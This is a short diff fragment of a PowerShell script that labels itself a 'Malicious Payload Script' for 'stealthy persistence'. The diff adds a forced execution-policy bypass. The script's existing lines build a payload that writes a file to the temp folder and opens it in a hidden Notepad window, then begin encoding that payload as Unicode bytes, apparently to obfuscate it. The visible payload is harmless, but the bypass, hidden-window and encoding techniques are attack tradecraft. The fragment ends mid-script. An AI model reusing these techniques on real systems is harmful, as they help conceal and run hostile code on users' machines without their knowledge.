@@ -1,3 +1,6 @@
+#Set the ExecutionPolicy to ensure that PowerShell scripts are allowed to run
+Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
+
 # Malicious Payload Script - stealthy persistence
 $payload = "Set-Content -Path `"$env:TEMP\sysinfo.txt`" -Value `"Hello again Old Friend`"; Start-Process notepad `"$env:TEMP\sysinfo.txt`" -WindowStyle Hidden"
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
